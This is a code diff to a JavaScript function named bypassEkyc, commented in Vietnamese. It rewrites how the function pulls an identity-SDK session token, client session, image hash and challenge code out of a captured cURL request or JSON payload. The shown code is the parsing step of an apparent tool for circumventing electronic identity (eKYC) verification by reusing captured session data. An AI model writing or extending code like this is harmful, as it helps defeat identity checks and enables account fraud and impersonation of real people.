@@ -559,35 +559,26 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
         let realImageHash = '';
         
         if (idgPayloadRaw) {
-            let jsonStr = idgPayloadRaw;
-            
-            // Trich xuat challenge_code tu URL bat ke co phai cURL hay khong
-            const urlMatch = idgPayloadRaw.match(/challenge_code=([^&'"\s\\]+)/);
-            if (urlMatch) realChallengeCode = urlMatch[1];
-            
-            // Neu user copy as cURL (bash)
-            if (idgPayloadRaw.startsWith('curl ')) {
-                // Trich xuat JSON data (tim flag --data-raw hoac --data)
-                const dataMatch = idgPayloadRaw.match(/--data(?:-raw)?\s+'([^']+)'/);
-                if (dataMatch) {
-                    jsonStr = dataMatch[1];
-                } else {
-                    // Thu bat dau sau keyword data neu dung format khac
-                    const match2 = idgPayloadRaw.match(/{[\s\S]*}/);
-                    if (match2) jsonStr = match2[0];
-                }
-            } else {
-                // Neu user chi copy URL va {}
-                const match2 = idgPayloadRaw.match(/{[\s\S]*}/);
-                if (match2) jsonStr = match2[0];
-            }
-            
             try {
-                const parsed = JSON.parse(jsonStr);
-                idgSdkSessionToken = parsed.token || '';
-                realClientSession = parsed.client_session || '';
-                realImageHash = parsed.img || '';
-                console.log('[IDG SDK Payload] ✅ Parsed ok. Token:', !!idgSdkSessionToken, 'ClientSession:', !!realClientSession, 'ChallengeCode:', !!realChallengeCode, 'ImageHash:', !!realImageHash);
+                // Remove all spaces and newlines around keys/values for a looser regex match, or just use a regex that handles whitespace
+                const imgMatch = idgPayloadRaw.match(/"img"\s*:\s*"([^"]+)"/i) || idgPayloadRaw.match(/'img'\s*:\s*'([^']+)'/i);
+                if (imgMatch) realImageHash = imgMatch[1].trim();
+
+                const sessionMatch = idgPayloadRaw.match(/"client_session"\s*:\s*"([^"]+)"/i) || idgPayloadRaw.match(/'client_session'\s*:\s*'([^']+)'/i);
+                if (sessionMatch) realClientSession = sessionMatch[1].trim();
+                
+                const tokenMatch = idgPayloadRaw.match(/"token"\s*:\s*"([^"]+)"/i) || idgPayloadRaw.match(/'token'\s*:\s*'([^']+)'/i);
+                if (tokenMatch) idgSdkSessionToken = tokenMatch[1].trim();
+                
+                const challengeMatch = idgPayloadRaw.match(/challenge_code=([^&\s]+)/i);
+                if (challengeMatch) realChallengeCode = challengeMatch[1].trim();
+                
+                console.log('[IDG SDK Payload] ✅ Parsed ok.', 
+                    'Token:', !!idgSdkSessionToken, 
+                    'ClientSession:', !!realClientSession, 
+                    'ChallengeCode:', !!realChallengeCode,
+                    'ImageHash:', !!realImageHash
+                );
             } catch(e) {
                 // Truong hop chi paste moi chuoi token (backward compatible)
                 idgSdkSessionToken = idgPayloadRaw.includes('{') ? '' : idgPayloadRaw;
